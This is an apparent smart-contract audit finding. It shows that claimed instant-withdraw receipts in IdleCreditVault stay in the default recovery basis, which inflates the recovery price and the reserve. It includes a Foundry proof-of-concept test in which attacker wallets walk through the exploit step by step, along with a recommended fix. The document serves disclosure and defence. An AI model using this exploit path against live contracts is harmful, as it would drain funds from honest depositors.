### Title
Claimed instant-withdraw receipts remain in default recovery basis, overstating reserve and diluting recovery - (`contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`claimInstantWithdrawRequest()` burns and pays a funded instant receipt but leaves its per-epoch basis in both `instantWithdrawsRequestsByEpoch` and `instantWithdrawClaimsByEpoch`. [1](#0-0)  If another current-epoch instant request remains unfunded and the borrower subsequently defaults, `defaultPendingClaimBasis()` counts the already-paid receipt while `_defaultPrefundedInstantReserve()` treats it as cash still held by the strategy. [2](#0-1) [3](#0-2)  This pushes `defaultRecoveryPrice` toward `1e18` without increasing actual strategy cash. [4](#0-3) 

### Finding Description
An attacker can enter during the buffer phase with two KYC-approved wallets and request instant withdrawals for both after an APR decrease. `requestInstantWithdraw()` records each request in the aggregate ledger, the per-user epoch ledger, and the current epoch’s total claim basis. [5](#0-4) 

During `startEpoch`, the CDO transfers only available cash to the strategy through `collectInstantWithdrawFunds`, which reduces `pendingInstantWithdraws` but does not distinguish which users were funded. [6](#0-5) [7](#0-6)  The attacker claims the funded wallet through `claimInstantWithdrawRequest`, receives the underlying, and clears only the aggregate `instantWithdrawsRequests` entry. [8](#0-7) 

The stale epoch basis remains. When the remaining request cannot be funded at the instant deadline, honest `getInstantWithdrawFunds` handling puts the CDO into default, and `finalizeDefaultRecovery` uses `instantWithdrawClaimsByEpoch[epochNumber]` both as pending-claim basis and as evidence that `instantBasis - pendingInstantWithdraws` is a prefunded reserve. [9](#0-8)  The “prefunded” amount includes cash already paid to and withdrawn by the first attacker wallet, so it does not exist in the strategy.

### Impact Explanation
The broken invariant is one instant receipt corresponds to one payout and recovery reserve must equal actual claimable underlying.

For a simplified case with active basis `B`, an already-claimed attacker receipt `A`, an unfunded attacker/victim receipt `U`, and external recovery `R`, the code computes:

```text
price_buggy = (R + A) / (B + A + U)
price_correct = R / (B + U)
```

Whenever `R / (B + U) < 1`, the stale `A` increases the recovery price without adding cash. A remaining attacker-controlled receipt can claim at this inflated price and remove more underlying than its fair recovery share. Alternatively, if the stale claim is processed first, honest remaining claimants can be left unable to withdraw because `defaultRecoveryReserve` overstates actual token balance and `_transferDefaultRecovery` both decrements the inflated reserve and transfers real tokens. [10](#0-9) 

The attacker needs no privileged action: they only deposit, request withdrawals, and claim a funded instant receipt. The default itself is produced by honest manager sequencing and borrower nonpayment.

### Likelihood Explanation
Likelihood is moderate but deployment-dependent. It requires instant withdrawals to be enabled, an APR decrease sufficient to route requests into instant mode, partial instant funding at `startEpoch`, and borrower failure to cover the remainder by the instant deadline. [11](#0-10) [12](#0-11)  Those conditions are an intended stress path explicitly modeled by the vault’s partial-prefunding and default-recovery code rather than an unreachable state. [13](#0-12) 

### Recommendation
Clear a funded receipt from both instant ledgers when it is claimed, or track funded and unfunded amounts separately per user/epoch.

At minimum, in `claimInstantWithdrawRequest()` identify the current request epoch basis and decrement:

```solidity
instantWithdrawsRequestsByEpoch[_user][requestEpoch] -= amount;
instantWithdrawClaimsByEpoch[requestEpoch] -= amount;
```

Because the aggregate can contain receipts from multiple epochs, the safer fix is to retain a funded-claims ledger or per-epoch funded amount rather than reconstructing the epoch from mutable state. `defaultPendingClaimBasis()` should count only unclaimed current-epoch instant receipts, while `_defaultPrefundedInstantReserve()` should count only cash still held for unclaimed receipts. Add a regression test where one instant claimant is paid before the deadline and another remains unfunded through default finalization.

### Proof of Concept
A Foundry PoC can be built on the existing `IdleCreditVault` fork-test harness:

```solidity
function testClaimedInstantReceiptInflatesDefaultRecovery() external {
  uint256 delay = cdoEpoch.instantWithdrawDelay();
  vm.prank(manager);
  cdoEpoch.setInstantWithdrawParams(delay, 1000, false);

  address attackerClaimed = makeAddr("attacker-claimed");
  address attackerPending = makeAddr("attacker-pending");

  uint256 claimedAmount = 10_000 * ONE_SCALE;
  uint256 pendingAmount = 10_000 * ONE_SCALE;

  _depositWithUser(attackerClaimed, claimedAmount, true);
  _depositWithUser(attackerPending, pendingAmount, true);

  _startEpochAndCheckPrices(0);
  _stopEpochAndCheckPrices(
    0,
    initialProvidedApr / 2,
    _expectedFundsEndEpoch()
  );

  // Both requests enter instant mode in the buffer phase.
  vm.prank(attackerClaimed);
  uint256 claimedBasis = cdoEpoch.requestWithdraw(0, address(AAtranche));
  vm.prank(attackerPending);
  uint256 pendingBasis = cdoEpoch.requestWithdraw(0, address(AAtranche));

  // Arrange only enough CDO cash to fund the first request.
  deal(
    defaultUnderlying,
    address(cdoEpoch),
    claimedBasis
  );

  _startEpochAndCheckPrices(1);

  IdleCreditVault creditVault = IdleCreditVault(address(strategy));
  assertEq(creditVault.pendingInstantWithdraws(), pendingBasis);

  // First attacker receipt is fully paid before the instant deadline.
  vm.prank(attackerClaimed);
  cdoEpoch.claimInstantWithdrawRequest();

  // Stale basis remains even though its receipt and cash are gone.
  assertEq(
    creditVault.instantWithdrawsRequestsByEpoch(
      attackerClaimed,
      creditVault.epochNumber()
    ),
    claimedBasis
  );
  assertEq(
    creditVault.instantWithdrawClaimsByEpoch(creditVault.epochNumber()),
    claimedBasis + pendingBasis
  );

  // Honest manager reaches the deadline; borrower does not fund remainder.
  vm.warp(block.timestamp + delay + 1);
  vm.prank(manager);
  cdoEpoch.getInstantWithdrawFunds();
  assertTrue(cdoEpoch.defaulted());

  uint256 activeBasis =
    cdoEpoch.getContractValue()
      + cdoEpoch.expectedEpochInterest()
      - cdoEpoch.pendingWithdrawFees();

  uint256 buggyBasis =
    activeBasis + creditVault.defaultPendingClaimBasis();

  // Deliberately recover less than par against the true outstanding basis.
  uint256 recovered = activeBasis * 6e17 / 1e18;
  deal(defaultUnderlying, manager, recovered);
  vm.startPrank(manager);
  IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
  cdoEpoch.finalizeDefault(recovered, manager);
  vm.stopPrank();

  uint256 buggyPrice = creditVault.defaultRecoveryPrice();
  uint256 correctPrice =
    recovered * 1e18 / (activeBasis + pendingBasis);

  // The already-paid `claimedBasis` was added to both reserve and basis.
  assertGt(buggyPrice, correctPrice);
  assertEq(
    creditVault.defaultRecoveryReserve(),
    recovered + claimedBasis
  );
  assertEq(
    IERC20Detailed(defaultUnderlying).balanceOf(address(strategy)),
    recovered
  );

  // The pending attacker-controlled receipt claims at the inflated ratio.
  uint256 before = IERC20Detailed(defaultUnderlying).balanceOf(attackerPending);
  vm.prank(attackerPending);
  cdoEpoch.claimInstantWithdrawRequest();
  uint256 received =
    IERC20Detailed(defaultUnderlying).balanceOf(attackerPending) - before;

  assertGt(received, pendingBasis * correctPrice / 1e18);
}
```

The exact helper calls may need to match the repository’s local test setup, but the essential state transition is direct: partial instant funding, successful claim of one receipt, stale epoch basis retained, borrower default, then inflated `defaultRecoveryPrice` and phantom `defaultRecoveryReserve`.

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L279-289)
```text
      pendingWithdraws += _amount;
    }
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L356-374)
```text
  function requestInstantWithdraw(uint256 _amount, address _user) external {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();
    // burn strategy tokens from cdo
    _burn(msg.sender, _amount);
  
    // mint equal amount of strategy tokens to the user as receipt, useful in case of default
    _mint(_user, _amount);

    // increase the instant withdraw requests for the user
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L380-392)
```text
  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L398-402)
```text
  function collectInstantWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    if (_amount == 0) return;
    pendingInstantWithdraws -= _amount;
    underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L636-640)
```text
  /// @dev Normal pending withdraws are already tracked globally. Current-epoch instant receipts
  /// join recovery only if `pendingInstantWithdraws` is still non-zero at finalization. This can
  /// happen when startEpoch moved the CDO's available cash to the strategy but that cash covered
  /// only part of the instant queue. The full current-epoch instant claim is included as basis,
  /// while the already-funded part is added to the reserve by `_defaultPrefundedInstantReserve()`.
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L644-648)
```text
  function defaultPendingClaimBasis() public view returns (uint256 basis) {
    basis = pendingWithdraws;
    if (pendingInstantWithdraws != 0) {
      basis += instantWithdrawClaimsByEpoch[epochNumber];
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L679-696)
```text
    uint256 pendingBasis = defaultPendingClaimBasis();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (totalBasis == 0) revert NotAllowed();

    // Some recovery funds may already be in this strategy: partially prefunded instant requests
    // and borrower-send funds that failed at epoch start. Count both without pulling them again.
    uint256 prefundedReserve = _defaultPrefundedInstantReserve();
    uint256 reserveAmount = _recoveredAmount + prefundedReserve + defaultRecoveryReserve;
    // Recovery can be above par if the recovered funds exceed the computed basis.
    uint256 recoveryPrice = reserveAmount * RECOVERY_FULL / totalBasis;

    defaultRecoveryFinalized = true;
    defaultRecoveryReserve = reserveAmount;
    defaultRecoveryPrice = recoveryPrice;
    defaultRecoveryEpoch = epochNumber;
    // A non-zero pending instant bucket means current-epoch instant receipts were not fully funded
    // and must be paid through the same recovery ratio as normal pending receipts.
    defaultInstantWithdrawsFinalized = pendingInstantWithdraws != 0;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L716-722)
```text
  function _defaultPrefundedInstantReserve() internal view returns (uint256 prefundedReserve) {
    uint256 pendingInstant = pendingInstantWithdraws;
    if (pendingInstant == 0) return prefundedReserve;
    uint256 instantBasis = instantWithdrawClaimsByEpoch[epochNumber];
    if (instantBasis > pendingInstant) {
      prefundedReserve = instantBasis - pendingInstant;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L912-916)
```text
  function _transferDefaultRecovery(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    // Every defaulted or post-default claim consumes the isolated recovery reserve.
    defaultRecoveryReserve -= _amount;
    underlyingToken.safeTransfer(_user, _amount);
```

**File:** contracts/IdleCDOEpochVariant.sol (L279-292)
```text
    uint256 pendingInstant = _pendingInstant();
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
```

**File:** contracts/IdleCDOEpochVariant.sol (L761-768)
```text
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
```
